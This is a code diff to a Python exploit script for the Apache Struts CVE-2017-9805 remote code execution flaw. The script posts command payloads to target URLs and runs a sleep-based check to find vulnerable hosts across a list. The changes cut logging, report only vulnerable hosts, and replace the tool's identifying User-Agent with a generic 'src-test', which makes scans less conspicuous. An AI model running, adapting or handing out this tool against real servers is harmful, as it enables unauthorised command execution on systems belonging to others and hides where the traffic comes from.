@@ -102,19 +102,18 @@ def exploit(url, cmd, dont_print_status_on_console=False):
     try:
         output = requests.post(url, data=payload, headers=headers, verify=False, timeout=timeout, allow_redirects=False).text
     except Exception as e:
-        logger.info("EXCEPTION::::--> " + str(e))
+        # logger.info("EXCEPTION::::--> " + str(e))
         output = 'ERROR'
     return(output)
 
 
 def check(url):
     url = url_prepare(url)
-    logger.info('\n[*] URL: %s' % (url))
 
     initial_request = exploit(url, "", dont_print_status_on_console=True)
     if initial_request == "ERROR":
         result = False
-        logger.info("The host does not respond as expected.")
+        # logger.info("The host does not respond as expected.")
         return(result)
 
     payload_sleep_based_10seconds = """
@@ -218,7 +217,7 @@ AAoAAQACABYAEAAJ</byte-array>
 </map>
 """
     headers = {
-        'User-Agent': 'Apache-struts-pwn (https://github.com/Lone-Ranger/apache-struts-pwn_CVE-2017-9805)',
+        'User-Agent': 'src-test',
         # 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
         'Referer': str(url),
         'Content-Type': 'application/xml',
@@ -251,10 +250,10 @@ def start(**kwargs):
             result = check(url)
             output = '[*] Status: '
             if result is True:
+                logger.info('[*] URL: %s' % (url))
+
                 output += 'Vulnerable!'
-            else:
-                output += 'Not Affected.'
-            logger.info(output)
+                logger.info(output)
         else:
             exploit(url, cmd)
             logger.info("[$] Request sent.")
